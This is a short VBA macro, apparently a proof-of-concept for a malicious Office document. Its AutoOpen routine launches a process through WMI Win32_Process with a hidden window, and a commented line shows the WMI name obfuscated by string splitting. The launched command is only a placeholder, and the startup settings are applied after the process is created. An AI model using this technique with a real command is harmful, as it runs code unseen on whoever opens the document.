Sub autoopen()
    Set o = GetObject("WinMgmts:Win32_Process")
    'Set o = GetObject(CVar("wi") + CVar("nmgmt") + "s:Win3" + CVar("2_Proce") + CVar("ss"))
    o.Create "Yo man", "one", "two", "three"
    Set p = GetObject("WinMgmts:Win32_ProcessStartup")
    p.ShowWindow = 0
End Sub
